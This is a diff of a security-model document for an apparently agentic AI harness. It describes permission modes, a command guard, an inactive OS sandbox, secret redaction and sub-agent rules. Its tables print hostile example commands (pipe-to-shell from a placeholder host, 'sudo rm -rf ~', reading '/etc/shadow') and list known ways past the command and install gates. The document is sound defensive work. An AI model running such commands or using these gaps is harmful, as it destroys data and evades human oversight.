@@ -1,9 +1,10 @@
 # Security Model
 
-> **Last reviewed against workspace version 0.9.8**
+> **Last reviewed against workspace version 0.9.14 plus the CHANGELOG
+> `[Unreleased]` changes**
 >
 > Scope: the `origin` agentic harness Rust workspace (`Cargo.toml`,
-> `version = "0.9.8"`). This document is normative for the security posture of
+> `version = "0.9.14"`). This document is normative for the security posture of
 > the daemon, CLI, IPC transport, sandbox, permission engine, and credential
 > store. Where the prose and the code disagree, **the code wins** — every claim
 > below cites the file it is grounded in.
@@ -20,18 +21,24 @@ cleared it, and it confines the blast radius of any action that does run.
 
 The architecture is **defence in depth**. No single control is load-bearing:
 
-1. A tier-based **permission gate** (`origin-permission`) decides whether a tool
-   call needs human approval.
+1. A tier-based **permission gate** (`origin-permission`) and the daemon's
+   **permission modes** (`workspace` by default; see
+   [Permission modes](#permission-modes-workspace--on--off)) decide whether a tool
+   call runs, is asked about, or is denied.
 2. A skills **allowed-tools mask** (`origin-skills` + `origin-permission`)
    shrinks the reachable tool surface for a task.
-3. **Command-line safety analysis** (`origin-cmdparse`) hardens the gate against
-   bash bypass shapes before any auto-approval.
-4. **Per-tool OS sandbox profiles** (`origin-sandbox`) confine the child process
-   that a tool spawns.
+3. **Command-line safety analysis** (`origin-cmdparse`) parses each Bash command
+   and refuses or asks about what it cannot vouch for.
+4. **Per-tool OS sandbox profiles** (`origin-sandbox`) are designed to confine
+   the child process a tool spawns. **No backend is enabled on any shipped
+   build**, so today nothing a tool spawns is OS-confined; see
+   [Sandboxing per platform](#sandboxing-per-platform-origin-sandbox).
 5. A **dynamic per-prompt policy** (`origin-conseca`) and a **layered governance
    policy** (`origin-policy`) bound tools, models, paths, domains, and spend.
-6. **Secret isolation** (`origin-keyvault`, `Secret<T>`, the `lint-secrets` CI
-   gate) keeps credentials out of logs, traces, and `Debug` output.
+6. **Secret isolation** (`origin-keyvault`, `Secret<T>`, an allow-listed child
+   environment, by-value redaction of known credentials in tool output, and the
+   `lint-secrets` check) keeps credentials out of logs, traces, `Debug` output
+   and model-driven processes, within the limits stated below.
 7. **Mutually-authenticated, certificate-pinned transport** (`origin-ipc`,
    `origin-resume-token`) for any remote or cross-process trust decision.
 
@@ -44,8 +51,8 @@ names the primary defending subsystem.
 | ------ | ------------------- | --------------- | ----- |
 | **Untrusted model output** | The model emits a tool call that exfiltrates data or destroys the workspace, possibly under prompt injection. | Tier gate + per-prompt policy generated from *trusted* task text only. | `origin-permission`, `origin-conseca` |
 | **Malicious tool arguments** | A bash invocation is shaped to dodge a name-based allowlist (`cd` escape, env-prefix, `curl … \| sh`). | String-only command analysis that downgrades or blocks auto-approval. | `origin-cmdparse` |
-| **Secret exfiltration** | A tool reads `~/.ssh`/`.env` and pipes to the network, or a secret leaks via `Debug`/tracing. | `cmdparse` exfil detectors + `Secret<T>` redaction + `lint-secrets` CI gate. | `origin-cmdparse`, `origin-keyvault`, `xtask` |
-| **Sandbox escape** | A spawned child process tries to read/write outside its scope, open a socket, or fork-bomb the host. | Per-OS confinement: landlock+seccomp+rlimit / `sandbox-exec` / AppContainer+Job Object. | `origin-sandbox` |
+| **Secret exfiltration** | A tool reads `~/.ssh`/`.env` and pipes to the network, or a secret leaks via `Debug`/tracing. | `cmdparse` exfil detectors + allow-listed child env + by-value redaction + `Secret<T>` redaction + `lint-secrets` (not yet in CI). | `origin-cmdparse`, `origin-sandbox` (`env`), `origin-daemon` (`redact`), `origin-keyvault`, `xtask` |
+| **Sandbox escape** | A spawned child process tries to read/write outside its scope, open a socket, or fork-bomb the host. | **None on shipped builds** (no OS backend is enabled). Mitigation is the permission mode: unsandboxed Bash asks first in mode `workspace`. | `origin-sandbox` (inactive), permission modes |
 | **Network/domain bypass** | A URL is crafted so the allowlist parses a different host than the HTTP client dials. | WHATWG-faithful host extraction that mirrors `reqwest`'s parser. | `origin-conseca` |
 | **Remote peer impersonation** | An attacker connects to (or stands up) a daemon over QUIC and is implicitly trusted. | Mutual TLS with SHA-256 certificate pinning; empty allow-list fails closed. | `origin-ipc` |
 | **Resume-token tampering** | An attacker who can write the state dir swaps a token to steer a resumed daemon into arbitrary CAS content. | BLAKE3 keyed-MAC envelope verified in constant time. | `origin-resume-token` |
@@ -74,8 +81,9 @@ names the primary defending subsystem.
                               |  approved action
                               v
    +-----------------------------------------------------------+
-   |                    CONFINED EXECUTION                     |
-   |  origin-sandbox   per-tool SandboxProfile (OS enforced)   |
+   |                    EXECUTION                              |
+   |  origin-sandbox   per-tool SandboxProfile (NOT enforced   |
+   |                   on shipped builds); allow-listed env    |
    |  origin-keyvault  Secret<T>, OS keystore, audit ring      |
    +-----------------------------------------------------------+
                               |  authenticated transport
@@ -127,23 +135,25 @@ pub trait Prompter: Send + Sync {
 ```
 
 The trait ships with `AlwaysAllow` and `AlwaysDeny` test prompters; the
-production prompter lives in the TUI client, and a headless prompter defaults to
-auto-deny. This indirection means the *enforcement point* is the daemon, never
-the model — the model can request a `RequiresPermission` tool but cannot answer
-the prompt on the human's behalf.
+production prompter is the daemon's IPC prompter, answered in the TUI. Which
+calls reach it, and what happens when nobody can answer, is decided by the
+daemon's permission mode (next section but one). This indirection means the
+*enforcement point* is the daemon, never the model — the model can request a
+`RequiresPermission` tool but cannot answer the prompt on the human's behalf.
 
 ### Tiers at a glance
 
 | Tier | Meaning | Triggers a prompt? | Example tools (file) |
 | ---- | ------- | ------------------ | -------------------- |
-| `AutoAllowed` | Read-only / pure / non-exfiltrating; safe to run without asking. | No — bypasses the `Prompter`. | `read` (`builtins/read.rs`), `glob_tool`, `grep_tool`, `diagnostics`, `lsp_nav`, `monitor`, `mem` *(search)*, `tool_search`, `ask`, `ask_user`, `graph_query`/`graph_explain`/`graph_path`/`graph_summarize`, `recall`, `task` |
-| `RequiresPermission` | Mutating, network-reaching, or privacy-sensitive; needs explicit human approval. | Yes — calls `prompter.ask(...)`. | `bash` (`builtins/bash.rs`), `edit`, `multi_edit`, `write`, `apply_patch`, `web_fetch`, `web_search`, `browser`, `gmail`, `graph_rebuild`, `author_workflow`, `run_workflow`, `mem` *(save/forget)* |
+| `AutoAllowed` | Read-only / pure / non-exfiltrating; safe to run without asking. | No — bypasses the `Prompter`. | `read` (`builtins/read.rs`), `glob_tool`, `grep_tool`, `diagnostics`, `lsp_nav`, `monitor`, `mem` *(search)*, `tool_search`, `ask`, `ask_user`, `graph_query`/`graph_explain`/`graph_path`/`graph_summarize`, `recall`, `CollectTasks` |
+| `RequiresPermission` | Mutating, network-reaching, or privacy-sensitive; needs explicit human approval. | Depends on the permission mode (see below). | `bash` (`builtins/bash.rs`), `edit`, `multi_edit`, `write`, `apply_patch`, `web_fetch`, `web_search`, `browser`, `gmail`, `graph_rebuild`, `author_workflow`, `run_workflow`, `task`, `mem` *(save/forget)* |
 
 > Tiers are assigned per builtin in `crates/origin-tools/src/builtins/*.rs`
-> (grep `tier:` confirms each). Note that `task` (spawning a swarm worker) is
-> `AutoAllowed` because the child is itself confined and re-enters the same gate
-> for its own tool calls; `gmail` is `RequiresPermission` because it reads
-> private mail.
+> (grep `tier:` confirms each). `task` (spawning a swarm worker) is
+> `RequiresPermission` (A4): its permission preview starts with
+> `<G>/<T> gated tools, <D> mcp servers`, the number of permission-gated tools
+> and MCP servers the worker would be granted. `gmail` is `RequiresPermission`
+> because it reads private mail.
 
 ### Bloom-prefiltered rules and skill narrowing
 
@@ -233,35 +243,61 @@ gate runs inline and offline to harden that decision
 
 `analyze(line) -> Analysis` runs every detector and returns a list of `Risk`s;
 `worst(&analysis)` reduces them with the ordering
-**`Dangerous` > `Suspicious` > `Safe`**:
+**`Dangerous` > `NeedsApproval` > `Suspicious` > `Safe`**:
 
 ```rust
-pub enum Risk { Safe, Suspicious(String), Dangerous(String) }
+pub enum Risk { Safe, Suspicious(String), NeedsApproval(String), Dangerous(String) }
 ```
 
-A typical gate policy: `Dangerous` blocks auto-approval outright; `Suspicious`
-downgrades auto-approval to an explicit confirmation; `Safe` is eligible for
-auto-approval on that axis.
+How the daemon acts on the verdict (`apply_cmd_guard` in
+`crates/origin-daemon/src/agent.rs`, on unless `ORIGIN_CMD_GUARD=0`):
+`Dangerous` is refused without an ask; `NeedsApproval` (the program cannot be
+determined statically, or the line cannot be parsed) goes through the
+permission prompt and is denied when nobody can be asked; `Suspicious` is
+advisory only. The crate calls itself **an intent filter, not a security
+boundary**: a shell is Turing-complete, so a determined adversary can always
+build a command it does not understand (a script written earlier, an alias, a
+binary that deletes files).
+
+**Turn-end gate commands** (`auto_test`, `auto_lint`, the repro gate, test
+selection, best-of-N's oracle) go through the same analysis with nobody to ask:
+a command rated `Dangerous` or `NeedsApproval` is **not run**, and the only trace
+is a daemon log line (`gate command skipped by the command guard: …`). A
+configured test command that uses shell substitution therefore stops running
+silently until it is simplified or `ORIGIN_CMD_GUARD=0` is set.
 
 ### How it analyzes a line
 
-1. `split_commands` splits on `;`, `&&`, `||`, `|`, and newlines, **but never
-   inside single or double quotes**, so a separator embedded in a quoted string
-   does not fool the splitter (`echo "a; b"; ls` → `["echo \"a; b\"", "ls"]`).
-2. Cross-command shapes run over the whole lower-cased line; per-command shapes
-   run over each split command.
-3. `effective_command` skips leading `NAME=value` assignments **and** wrapper
-   commands (`sudo`, `doas`, `env`, `command`, `builtin`, `exec`, `time`,
-   `nice`, `ionice`, `nohup`, `setsid`, `stdbuf`, `xargs`) and normalizes a
-   path/alias-suppressed program name (`/bin/rm`, `./rm`, `\rm` → `rm`) so the
-   real program cannot hide behind a prefix.
+1. The line is **parsed**, not pattern-matched: it is tokenized with the quoting
+   rules of the shell that will run it (`sh -c` on Unix, `pwsh -Command` on
+   Windows) and split into simple commands at `;` `&&` `||` `|` `&` and
+   newlines, never inside quotes.
+2. Every subshell, `$(…)`, backtick and `<(…)` body is analysed too; the
+   wrappers `bash -c`, `sh -c`, `pwsh -Command`, `cmd /c`, `eval` and `iex` are
+   followed into their script.
+3. Leading `NAME=value` assignments and prefix commands (`sudo`, `env`,
+   `xargs`, `nohup`, `time`, `timeout`, `chrt`, …) are skipped to reach the real
+   program, and a path/alias-suppressed program name (`/bin/rm`, `./rm`, `\rm`
+   → `rm`) is normalized. After a prefix command the first **four** non-option
+   words are each tried as the start of the real command (variable, glob and
+   group words excepted); past a per-scan budget of 4,096 such extra starts
+   (deeply nested wrappers) the line needs approval.
+
+Known limits (accepted, reported): the four-word window means
+`sudo -u a -g b -h host -p prompt rm -rf ~` is still rated `Safe`; a dynamic
+option value in first position is read as the program (`sudo -u $USER ls`
+needs approval); bash's single-dash long options (`bash -norc < evil.sh`,
+`bash -rcfile /dev/stdin -i foo < evil.sh`) are rated `Safe`; PowerShell
+`Start-Process` is not followed.
 
 ### Bypass classes it defends against
 
 | Detector | Bypass class it closes | Verdict | Example caught |
 | -------- | ---------------------- | ------- | -------------- |
-| `detect_cd_escape` | `cd` into a forbidden directory *before* an "approved" command, escaping a path-scoped allowlist. | `Suspicious` | `cd /etc && cat shadow` |
-| `detect_bare_env_prefix` | A leading `NAME=val` makes the *real* command the second word, dodging a first-word allowlist. | `Suspicious` | `FOO=bar evilcmd --do-it` |
+| `cd` check (in `check_cmd`) | `cd` into a forbidden directory *before* an "approved" command, escaping a path-scoped allowlist. | `Suspicious` | `cd /etc && cat shadow` |
+| bare-assignment check (in `check_cmd`) | A leading `NAME=val` makes the *real* command the second word, dodging a first-word allowlist. | `Suspicious` | `FOO=bar evilcmd --do-it` |
+| program unknown statically (in `check_cmd`) | A variable, substitution or glob in command position, `eval`/`iex`, `-EncodedCommand`, input piped into a shell, or a line that cannot be parsed. | `NeedsApproval` | `eval "$CMD"` |
+| `detect_install` (C6, with `dep_gate`) | Installing or running a package the project does not declare. See [Dependency-install gate](#dependency-install-gate-c6). | `NeedsApproval` | `npm install left-pad` (undeclared) |
 | `detect_rm_rf_home` | `rm -rf` (any flag order/grouping, long forms, `--no-preserve-root`) aimed at `~`, `$HOME`, `${HOME}`, `/`, or a `$HOME`/`~` with trailing slash — even behind `sudo`/`/bin/rm`/`\rm`/env prefix. | `Dangerous` | `sudo rm -rf ~`, `rm --recursive --force /`, `\rm -rf $HOME/` |
 | `detect_pipe_to_shell` | Remote content fetched and piped straight into an interpreter (`sh`/`bash`/`zsh`/`dash`/`python`/`perl`/`ruby`/`node`). | `Dangerous` | `curl https://x/install.sh \| sh` |
 | `detect_base64_to_shell` | Obfuscated payload decoded and executed. | `Dangerous` | `echo … \| base64 -d \| sh` |
@@ -276,6 +312,53 @@ analyzer is conservative on the safe side: `rm -rf ./build` and `rm -r ~/project
 (recursive without force, or a specific subpath) are deliberately **not**
 flagged `Dangerous`, so legitimate work is not gratuitously blocked.
 
+### Dependency-install gate (C6)
+
+On with the command guard (`ORIGIN_CMD_GUARD=0` turns both off). A `Bash`
+command that installs or runs a package the project does not declare gets
+`NeedsApproval`, naming the package; the manifests are read from the call's
+`cwd` up to the run's working directory (`crates/origin-daemon/src/dep_gate.rs`).
+
+- **Covered:** `npm|pnpm|yarn|bun install|add` (npm's aliases and typos, options
+  before the verb, `npm.cmd`), `pip install` (`pip3`, `pip3.12`, `python -m pip`,
+  `py -m pip`), `uv pip install`, `uv add`, `cargo add`, `go get`, found through
+  `sudo`/`timeout`/`env` (any option shape), `bash -c` and chains.
+- **Always needs approval, even for a declared name or with no package named:**
+  another index or registry (`--index-url`, `--extra-index-url`, `--find-links`,
+  `--registry`, glued `-i…`/`-f…`, bare `yarn --registry`, or
+  `PIP_INDEX_URL`/`PIP_EXTRA_INDEX_URL`/`PIP_FIND_LINKS`/`npm_config_registry`/`UV_INDEX_URL`/`UV_EXTRA_INDEX_URL`/`UV_INDEX`/`YARN_NPM_REGISTRY_SERVER`/`YARN_REGISTRY`/`GOPROXY`
+  set on the command, also for `npm ci`, and `npm cit`/`npm update`/`npm up`
+  with `--registry`); packages supplied at run time (`xargs`, `pip install -r` of
+  a URL/stdin/substitution). For named packages: global installs (`-g`,
+  `--location=global`, `uv pip install --system`, `yarn global add`,
+  `cargo install`, `go install x@v`), URL/VCS/path/tarball sources (also in the
+  version slot, `x@npm:y`), a working directory that does not resolve inside the
+  workspace, and a missing, over-1 MB or unparsable manifest.
+- **Run-from-registry forms:** `npx`/`npm exec` pass for a binary already in
+  `node_modules/.bin` or a declared package (a `-p` value must be declared);
+  `pnpm dlx`, `pnpx`, `yarn dlx`, `bunx`, `uvx`, `uv tool run`, `pipx run` only
+  for a declared package.
+- **Still not covered:** poetry, gem, apt, brew, corepack; `npm create`/`npm init
+  <x>`, `yarn create`, `pnpm create`, `bun create`; `uv run --with`,
+  `uv tool install`, `pipx install`; package managers run inside
+  `uv run`/`poetry run`/`pipenv run`; `pip download`/`pip wheel`; registry state
+  set by an earlier command or a config file; `--@scope:registry=`; a manifest
+  edited first (declare, then install, passes — every manifest under the
+  workspace is trusted, including `node_modules/*/package.json`);
+  `sudo pip install <declared>` (passes as declared); PowerShell
+  `Start-Process`. Two known extra asks: `pip install --upgrade pip` (pip is not
+  in the manifest) and `go install example.com/x` without a version (treated as
+  global).
+- With permission mode `off` (or `--dangerously-allow-all`) every ask is
+  approved, so the gate does not bite there.
+
+An opt-in companion, `ORIGIN_DIFF_REVIEW=1`, adds one-line regex tripwire notes
+to edit results (key-shaped secrets, `eval`/`exec` of dynamic input, shell or SQL
+built by concatenation, disabled TLS verification, `chmod 777`,
+`innerHTML`/`dangerouslySetInnerHTML` with non-literal input; they never block)
+and one tool-less model review of the run's diff at the end of the run. Not
+done: `cargo audit` or secret-scanner integration.
+
 ## Sandboxing per platform (origin-sandbox)
 
 `origin-sandbox` mutates a `std::process::Command` so the spawned child runs
@@ -285,6 +368,54 @@ dispatching to a per-OS backend gated behind `linux`/`macos`/`windows` cargo
 features. When no backend feature is active — or the `no-sandbox` escape hatch is
 set for CI matrices — it falls back to `backend_noop`, which logs at
 `tracing::warn!` so operators notice an accidental opt-out.
+
+### Status on shipped builds: no OS sandbox is active
+
+`crates/origin-tools/Cargo.toml` enables **no** `origin-sandbox` feature and the
+release workflow builds with no `--features`, so on **every platform** `apply`
+resolves to `backend_noop`: nothing a tool spawns (Bash, turn-end gate
+commands, hooks, MCP stdio servers) is OS-confined. The supervisor also
+discards `apply`'s error ("best-effort, spawn unconfined"), and the Windows
+PowerShell fallback spawn does not call it; hooks and MCP stdio servers call
+only the environment scrub.
+
+`origin_sandbox::sandbox_status()` reports this truthfully: `unavailable` on
+every platform, or `disabled_by_user` under `ORIGIN_SANDBOX=off`. It never
+reports `active`. The permission layer reads it: in mode `workspace`, Bash asks
+because no sandbox is active.
+
+What does exist is an **allow-listed child environment** (A6, `origin_sandbox::env`):
+children get only the allow-listed variables, minus anything named like a
+credential (`*_API_KEY`, `*_TOKEN`, `*_SECRET`, `*_PASSWORD`, `ANTHROPIC_*`,
+`OPENAI_*`, `AWS_*`, `GOOGLE_*`, `GEMINI_*`, `GITHUB_TOKEN`, `GH_TOKEN`,
+`ORIGIN_*KEY*`). It covers Bash, turn-end gate commands, hooks, MCP stdio
+servers, language servers and the LSP auto-installer, post-edit
+formatters/linters and syntax checks, notification commands and webhooks,
+shadow-git checkpoints and self-dev git (desktop toasts excepted). The
+`Browser` tool's backends do **not** scrub their environment: the
+`agent-browser` process (`crates/origin-browser/src/agent_browser.rs`) and the
+CloakBrowser sidecar (`cloak.rs`; spawned only with `ORIGIN_STEALTH_FALLBACK=1`
+since D11) inherit the daemon's environment, provider keys included. `ORIGIN_ENV_PASSTHROUGH` adds names (for example
+`HTTP_PROXY`, `HTTPS_PROXY`, `NO_PROXY`, `SSL_CERT_FILE`, `SSH_AUTH_SOCK`, or
+registry URLs such as `GOPROXY`, `PIP_INDEX_URL`, `NPM_CONFIG_REGISTRY`,
+`UV_INDEX_URL`, kept off the default list because they can embed
+`user:token@` credentials); `ORIGIN_ENV_SCRUB=0` restores full inheritance. See
+[environment variables](../reference/environment-variables.md#security-permissions--child-processes).
+
+Why the backends are not enabled (inventory at the time of writing; Linux and
+macOS behaviour was read from code, not run):
+
+| Backend | State | Why it is not enabled |
+| --- | --- | --- |
+| `backend_linux.rs` (landlock + seccomp + rlimits) | Real code | Landlock runs best-effort and its result is ignored, so on a kernel without landlock the child runs unconfined silently; rules are rooted at the daemon's cwd, not the workspace; `$HOME` toolchains, `/dev`, `/proc`, `/opt`, `/nix` are unreadable (so `> /dev/null` fails); the 60 CPU-second / 1 GiB address-space caps kill ordinary `cargo build`, node and JVM runs. |
+| `backend_macos.rs` (`sandbox-exec`) | Real code | Replaces the `Command`, discarding the env scrub, cwd and stdio set before it; `(deny default)` without mach/ipc allowances breaks many tools; `/tmp` vs `/private/tmp` and `$TMPDIR` are not handled; the cwd is interpolated into the profile unescaped; same rlimit caps. |
+| `backend_windows.rs` | Stub relative to its docs | Sets only `CREATE_SUSPENDED`; no AppContainer, no filesystem or network confinement. The Job Object attach is never called by the supervisor, so engaging it would leave every child suspended. |
+| `backend_noop.rs` | Noop | What every shipped build uses. |
+
+The design note on what enabling them would take is in
+[the design doc](../design/harness-efficiency-and-accuracy-proposals.md#what-an-os-sandbox-would-take).
+The profile and per-platform tables below describe what the backends are
+written to do, not what runs.
 
 ### Profiles
 
@@ -308,12 +439,12 @@ touches a string table (`crates/origin-sandbox/src/profile.rs`):
 | **Windows** | AppContainer-class restriction via `CREATE_SUSPENDED` + a restricted **Job Object** (`backend_windows.rs`). | `apply` sets `CREATE_SUSPENDED`; the spawn helper calls `attach_job_object_if_needed`, which sets `JOB_OBJECT_LIMIT_PROCESS_TIME` (60s CPU), `JOB_OBJECT_LIMIT_JOB_MEMORY` (1 GiB), `JOB_OBJECT_LIMIT_ACTIVE_PROCESS` (1), and `JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE` — so if the daemon dies, the kernel reaps the sandboxed child and leaves no lingering descendants — then `ResumeThread`s the child. |
 | **other / CI** | `backend_noop` (`backend_noop.rs`). | No confinement; logs `tracing::warn!`. Used when no OS backend feature is compiled or `no-sandbox` is set. |
 
-> **Known hardening backlog** (from `SECURITY.md`): scrub provider API keys from
-> the environment inherited by sandboxed children; make the `noop` backend
+> **Known hardening backlog** (from `SECURITY.md`): make the `noop` backend
 > fail-closed where confinement is expected; tighten the macOS read/network
-> profiles to the documented workspace scope. Operators who require strict
-> confinement should compile with the OS backend feature and **without**
-> `no-sandbox`.
+> profiles to the documented workspace scope. (Scrubbing provider API keys from
+> children's environment is done: A6.) Compiling a backend feature in as the
+> backends stand is **not** a way to get strict confinement: see the status
+> table above.
 
 ## Secret handling (origin-keyvault)
 
@@ -374,10 +505,200 @@ The `Secret<T>` discipline is enforced mechanically by `xtask lint-secrets`
 `#[derive(Debug)]` struct whose field name matches
 `(?i)(key|token|password|auth|secret|credential)` **unless** the field type is a
 `Secret<…>` or the field carries a `#[redact]` attribute. A violation prints
-`secret-redaction violation: …` and exits non-zero, failing CI. This is the
-backstop that stops a raw secret string from leaking through a `Debug`/`tracing`
-formatter (cf. the note in `crates/origin-gmail/src/error.rs`: "The
-`xtask lint-secrets` gate plus the `Secret<T>` … never the secret byte").
+`secret-redaction violation: …` and exits non-zero. Run it with
+`cargo run -p xtask -- lint-secrets` (there is no `cargo xtask` alias).
+
+**It is not run in CI**, and it does not pass today: at the time of writing it
+reports 11 violations (in `origin-browser`, `origin-cli`, `origin-daemon`,
+`origin-oidc`, `origin-provider-github` and `origin-provider-openai-compat`;
+some are real credentials held as `String`, some are false positives such as a
+`token_type` field). It becomes a CI gate once those are fixed or annotated.
+
+### Redaction of known credentials in tool output (C9)
+
+Separately from `Secret<T>`, the daemon redacts its own provider credentials **by
+value**: the values (8+ characters) of environment variables named like
+credentials (`*_API_KEY`, `*_TOKEN`, `*_SECRET`, `*_PASSWORD`, `PGPASSWORD`,
+`GITHUB_TOKEN`/`GH_TOKEN`, `ORIGIN_*_KEY`, `AWS_SECRET_ACCESS_KEY`) and keyvault
+credentials read at startup are replaced by `[REDACTED:<NAME>]` in tool output,
+turn-end gate output (including what the goal verifier sees) and persisted
+sessions, and the file-writing tools refuse to write such a marker back to
+disk. It is **best-effort**: keys added or rotated after startup, other
+accounts' secrets, and multi-line, escaped or truncated secrets are not caught.
+The session DB is created `0600` on Unix; this does **not** make the whole
+session store user-only (on Unix the content store and resume directory live
+under the system temp directory with default permissions). Opt-in
+`ORIGIN_SESSION_RETENTION_DAYS` prunes idle sessions on daemon start.
+
+## Permission modes (`workspace` / `on` / `off`)
+
+The daemon runs every session in one of three modes (C2). `/permissions
+workspace|on|off` switches it in the TUI (no argument shows the current mode).
+
+- **`workspace` (default).** Auto-allowed tools run; edits inside a workspace
+  root run without asking (every target path is resolved; an unresolvable path
+  counts as outside). Everything else permission-gated asks: Bash (no OS sandbox
+  is active on any shipped build), network tools (`WebFetch`, `WebSearch`,
+  `Browser`, `gmail`, `mcp__*`), writes outside the workspace, commands the
+  command guard rates `NeedsApproval`, and `Task` delegations that grant
+  permission-gated tools or MCP servers. `Dangerous` commands are refused
+  without an ask.
+- **`on`.** Every permission-gated call asks, including in-workspace edits and
+  read-only `Task`.
+- **`off`.** The old auto-allow: everything runs. Also what
+  `origin run --dangerously-allow-all` and `ORIGIN_ALLOW_ALL=1` select.
+
+**Headless, scheduled and ambient runs cannot ask anyone.** A call that would
+ask is denied and returned to the model as an error naming the way out, unless
+the run uses `--dangerously-allow-all` / `ORIGIN_ALLOW_ALL=1` or a config
+`[[permission_rules]]` allow rule covers it. The CLI strips `ORIGIN_ALLOW_ALL`
+from a daemon it spawns; a daemon's own `ORIGIN_ALLOW_ALL=1` applies to
+non-interactive requests only (logged once). An interactive `/goal` loop left
+unattended **blocks on the first ask** (the IPC prompter has no timeout).
+
+**Protected paths.** Inside a workspace root, edits to any `.git` or `.origin`
+path component, Origin's governance directory and `ORIGIN_HOME` ask every time
+("person" below), and a root that is, or contains, the home directory, or is a
+drive/filesystem root (or when the home directory is unknown), auto-allows no
+edit. This is the stated minimum: other files that run on next use (CI
+workflows, `package.json` scripts, Makefiles, build scripts) are ordinary
+project code and are edited without asking, and opt-in features that run code
+after an edit (autoformat, `auto_test`, LSP build scripts) turn such an edit
+into code execution.
+
+**Explicit deny rules win.** A `[[permission_rules]]` deny rule for a tool binds
+every context, including auto-allowed tools and the allow-all flag.
+
+**Session-scoped "Always allow".** An "Always allow <tool>" answer lasts for the
+session, in memory only (lost when the daemon restarts). It is never offered or
+honoured for `Task`, `RunWorkflow`, person-asks (outside/protected/home-root
+writes; network tools and Bash after taint), or guard-flagged commands.
+
+**Session taint.** Once a successful result from `WebFetch`, `WebSearch`,
+`Browser`, `gmail` or any `mcp__*` tool — or a sub-agent result that contained
+one — has entered a session, network tools and unsandboxed Bash ask every time
+for the rest of the session, ignoring "Always allow" answers (config allow
+rules, mode `off` and the allow-all flag still apply). Taint persists across
+reloads, compaction and resume. Error results and Bash `curl` output never
+taint.
+
+Decision table. **INT** = interactive, mode `workspace`; **HL** = headless
+(`origin run`, scheduled, ambient) without the flag; **FLAG** = mode `off`;
+**WRK** = inside a sub-agent (`Task` worker, `RunWorkflow` step, teammate: mode
+`on`, allow-list grant, cannot ask). "ask" = asked; "ask\*" = asked, and a
+standing "Always allow" skips the ask (only while untainted for network/Bash);
+"person" = asked every time, "Always allow" never offered nor honoured; "deny" =
+`is_error` result with the "cannot ask" text; "grant" = runs iff the tool is in
+the worker's allow-list, else deny. Every cell becomes **deny** under an
+explicit deny rule for the tool, a skill mask, or the deny-only overlays
+(policy, conseca, `/plan`, PreTool hooks, browser cap). An explicit allow rule
+makes ask/ask\*/person/deny/grant cells **allow** (also after taint; in a worker
+allow rules are not inherited), except a `NeedsApproval` command.
+
+| call | INT untainted | INT tainted | HL (either) | FLAG (either) | WRK untainted | WRK tainted |
+|---|---|---|---|---|---|---|
+| AutoAllowed tool | allow | allow | allow | allow | allow | allow |
+| edit inside workspace (ordinary file) | allow | allow | allow | allow | grant | grant |
+| edit to a protected path inside a root (`.git`, `.origin`, governance dir, `ORIGIN_HOME`) | person | person | deny | allow | deny | deny |
+| edit when the root is or contains the home dir, or is a drive root | person | person | deny | allow | deny | deny |
+| write outside the workspace (incl. symlink out, unresolvable) | person | person | deny | allow | deny | deny |
+| Bash, no OS sandbox (all shipped builds) | ask\* (first ask carries the no-sandbox notice) | person | deny | allow | grant | grant |
+| Bash, sandbox active (not reachable today) | allow | allow | allow | allow | grant | grant |
+| network tool (WebFetch, WebSearch, Browser, gmail, mcp__\*) | ask\* | person | deny | allow | grant | grant |
+| `NeedsApproval` command | person (one ask, guard reason first) | person | deny | allow | deny | deny |
+| `Dangerous` command | deny, no ask | deny | deny | deny | deny | deny |
+| `Task` with grants | person (every delegation) | person | deny | allow | n/a (no coordinator) | n/a |
+| `Task` read-only (`0/<T> gated tools, 0 mcp servers`) | allow | allow | allow | allow | n/a | n/a |
+| other gated tool (mem_save, graph_rebuild, AuthorWorkflow, RunWorkflow, …) | ask\* | ask\* | deny | allow | grant | grant |
+
+Best-of-N (`ORIGIN_BESTOFN`) does not start in mode `on`. Known limits: any
+client that can reach the daemon socket can send mode `off` (the local IPC
+trust boundary); hard links inside the workspace to files outside it count as
+inside; Unix symlink resolution and a live TUI session were not exercised when
+this was built.
+
+## Sub-agents (`Task`)
+
+- **Delegation asks.** `Task` is `RequiresPermission`. Its preview starts with
+  `<G>/<T> gated tools, <D> mcp servers` — `G` distinct permission-gated
+  registry tools the requested `allowed_tools` entries match, out of `T`, and `D`
+  distinct MCP servers — followed by the MCP names, the granting entries and the
+  goal (names escaped, quoted and capped). In mode `workspace` a delegation
+  granting nothing gated (`0/<T> gated tools, 0 mcp servers`) runs without an
+  ask. The header counts the gated tools but names them only through the
+  model-chosen entries, so with a small count the model can push *which* ones
+  past a narrow terminal's cut.
+- **Workers run on the approved allow-list and cannot ask.** A worker
+  auto-approves only what its grant names; anything that would need a person
+  (a `NeedsApproval` command, a write outside the workspace, a protected path)
+  is denied. Taint inside a worker does not revoke its grant (the approved
+  preview is the consent for that combination), and a tainted worker result
+  taints the parent session.
+- **Governance follows the worker.** Workers inherit the daemon's
+  `governance.toml` overlays (policy layers, conseca lists, `[[permission_rules]]`,
+  the browser action cap) (A4). Under a parent skill mask, `allowed_tools` is
+  narrowed to the mask and a `Task` naming any `mcp_servers` is refused; a
+  parent mask does not narrow the worker's AutoAllowed tools. Inside a worker,
+  `Task` and `RunWorkflow` return an error (no nested delegation).
+- **Inline MCP servers** are admitted only by name against servers defined in
+  user-scope config (`~/.origin/subagents/*.md` `mcp:`), and the worker runs the
+  user's definition; a model-supplied `command`/`url` is never run (A5).
+- **Turn cap.** A worker stops after **50** turns by default
+  (`"budget": {"max_tool_calls": N}` in the `Task` input overrides it; `0` or
+  omitted = 50).
+- **Return contract** (B8). The result reports the files the worker's
+  successful edits changed (`files_touched`, first 100), whether shell commands
+  ran, and a status — `completed`, `budget_exhausted` (turn cap), `aborted`
+  (permission denials) or `goal_unreachable` (error) — with the partial work
+  kept. The report text is capped at 8,000 characters with a notice of how many
+  were dropped. A worker's final report reaches the parent without an
+  `<external>` wrapper.
+
+## External content (C4, B12, A9)
+
+- **Provenance markers.** Results of `WebFetch`, `WebSearch`, `Browser`, `gmail`
+  and every `mcp__*` tool reach the model inside
+  `<external source="…" url="…">…</external>`, with marker look-alikes in the
+  content escaped, and the system prompt says such text is data, not
+  instructions.
+- **Quarantined `WebFetch`.** `WebFetch` takes a required `prompt`; the fetched
+  page (redacted first) goes to a tool-less call to a cheap model, and only its
+  answer (capped at 8,000 characters, itself wrapped) reaches the main loop.
+  This works on the **Anthropic provider only** (model: `ORIGIN_SIDECAR_MODEL`,
+  default `claude-haiku-4-5-20251001`); other providers get the wrapped raw
